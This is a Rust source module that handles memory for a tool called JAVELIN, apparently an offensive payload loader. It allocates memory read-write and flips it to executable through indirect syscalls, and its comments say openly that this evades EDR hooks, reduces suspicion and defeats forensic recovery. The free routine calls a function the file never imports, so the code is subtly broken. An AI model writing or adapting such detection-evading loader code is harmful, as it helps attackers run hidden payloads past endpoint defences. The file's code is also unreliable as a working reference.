//! Memory management for JAVELIN
//!
//! Handles allocation, protection transitions, and cleanup
//! Uses indirect syscalls via dinvk for EDR evasion

use std::error::Error;

#[cfg(target_os = "windows")]
use std::ffi::c_void;
#[cfg(target_os = "windows")]
use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCurrentProcess};
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::VirtualFree;
#[cfg(target_os = "windows")]
use winapi::um::winnt::MEM_RELEASE;

/// Memory region handle for cleanup
pub struct MemoryRegion {
    address: *mut u8,
    size: usize,
}

impl MemoryRegion {
    /// Creates a new memory region handle
    pub fn new(address: *mut u8, size: usize) -> Self {
        Self { address, size }
    }

    /// Gets the base address of the region
    pub fn address(&self) -> *mut u8 {
        self.address
    }

    /// Gets the size of the region
    pub fn size(&self) -> usize {
        self.size
    }
}

impl Drop for MemoryRegion {
    /// Automatically frees memory when the region goes out of scope
    /// Uses indirect syscall via dinvk for EDR evasion
    fn drop(&mut self) {
        #[cfg(target_os = "windows")]
        unsafe {
            if !self.address.is_null() {
                let mut base = self.address as *mut c_void;
                let mut size = self.size;
                // Use NtFreeVirtualMemory via dinvk
                let _ = NtFreeVirtualMemory(
                    NtCurrentProcess(),
                    &mut base,
                    &mut size,
                    0x8000, // MEM_RELEASE
                );
            }
        }
    }
}

/// Allocates memory as RW (PAGE_READWRITE) using indirect syscall
///
/// **OPSEC**: Allocating as RW first is less suspicious than direct RWX
/// Uses indirect syscall via dinvk to bypass EDR hooks
///
/// # Arguments
///
/// * `size` - Size in bytes to allocate
///
/// # Returns
///
/// * `Ok(MemoryRegion)` - Successfully allocated memory region
/// * `Err(_)` - Allocation failed
#[cfg(target_os = "windows")]
pub fn allocate_rw(size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    unsafe {
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size = size;
        
        let status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut base_address,
            0,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x04,   // PAGE_READWRITE
        );

        if status < 0 || base_address.is_null() {
            return Err("NtAllocateVirtualMemory failed".into());
        }

        Ok(MemoryRegion::new(base_address as *mut u8, region_size))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn allocate_rw(_size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    // Use libc mmap for non-Windows platforms
    Err("Non-Windows allocation not yet implemented".into())
}

/// Transitions memory from RW to RX (PAGE_EXECUTE_READ) using indirect syscall
///
/// **OPSEC**: RW → RX transition is standard practice and less suspicious than RWX
/// Uses indirect syscall via dinvk to bypass EDR hooks
///
/// # Arguments
///
/// * `region` - Memory region to transition
///
/// # Returns
///
/// * `Ok(())` - Protection changed successfully
/// * `Err(_)` - Protection change failed
#[cfg(target_os = "windows")]
pub fn transition_rx(region: &MemoryRegion) -> Result<(), Box<dyn Error>> {
    unsafe {
        let mut base = region.address() as *mut c_void;
        let mut size = region.size();
        let mut old_protect: u32 = 0;

        let status = NtProtectVirtualMemory(
            NtCurrentProcess(),
            &mut base,
            &mut size,
            0x20, // PAGE_EXECUTE_READ
            &mut old_protect,
        );

        if status < 0 {
            return Err("NtProtectVirtualMemory failed".into());
        }

        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
pub fn transition_rx(_region: &MemoryRegion) -> Result<(), Box<dyn Error>> {
    Err("Non-Windows memory protection not yet implemented".into())
}

/// Allocates memory as RWX (PAGE_EXECUTE_READWRITE) using indirect syscall
///
/// **Note**: Direct RWX allocation is more suspicious and may trigger alerts
/// Prefer allocate_rw() + transition_rx() instead
///
/// This function exists for compatibility but should be avoided in production
/// Uses indirect syscall via dinvk to bypass EDR hooks
#[cfg(target_os = "windows")]
pub fn allocate_rwx(size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    unsafe {
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size = size;
        
        let status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut base_address,
            0,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        );

        if status < 0 || base_address.is_null() {
            return Err("NtAllocateVirtualMemory RWX failed".into());
        }

        Ok(MemoryRegion::new(base_address as *mut u8, region_size))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn allocate_rwx(_size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    Err("Non-Windows allocation not yet implemented".into())
}

/// Cleans up and zeros memory before freeing
///
/// **OPSEC**: Zeroing memory prevents forensic recovery of sensitive data
///
/// # Arguments
///
/// * `region` - Memory region to clean up
pub fn cleanup_memory(region: &MemoryRegion) {
    unsafe {
        // Zero out the memory
        let slice = std::slice::from_raw_parts_mut(region.address(), region.size());
        crate::crypto::secure_zero(slice);
    }
    // Memory will be freed when MemoryRegion is dropped
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(target_os = "windows")]
    fn test_allocate_and_transition() {
        // Allocate 4KB as RW
        let region = allocate_rw(4096).expect("Failed to allocate memory");
        
        // Write some data
        unsafe {
            let slice = std::slice::from_raw_parts_mut(region.address(), 10);
            slice.copy_from_slice(b"test data!");
        }
        
        // Transition to RX
        transition_rx(&region).expect("Failed to transition to RX");
        
        // Verify we can still read
        unsafe {
            let slice = std::slice::from_raw_parts(region.address(), 10);
            assert_eq!(slice, b"test data!");
        }
        
        // Cleanup
        cleanup_memory(&region);
    }
}
